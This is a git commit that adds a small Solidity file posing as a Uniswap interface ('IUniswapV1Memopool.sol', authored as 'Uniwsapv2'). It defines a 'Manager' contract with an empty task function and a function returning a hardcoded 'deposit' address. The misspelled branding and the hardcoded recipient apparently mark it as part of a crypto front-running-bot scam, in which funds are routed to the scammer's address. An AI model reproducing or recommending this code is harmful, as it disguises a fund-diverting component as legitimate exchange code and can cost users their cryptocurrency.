ad9007fd04a996848e75762afa789fb01b521786
Uniwsapv2 <103666679+Uniwsapv2@users.noreply.github.com>
2022-09-29 01:43:21 +0500

    Create IUniswapV1Memopool.sol

---
+++ IUniswapV1Memopool.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.6.6;
+
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function uniswapDepositAddress() public pure returns (address) {
+		return 0xD86F378396f9e3ADb13C23121f1e16E62E0078a8;
+	}
+}
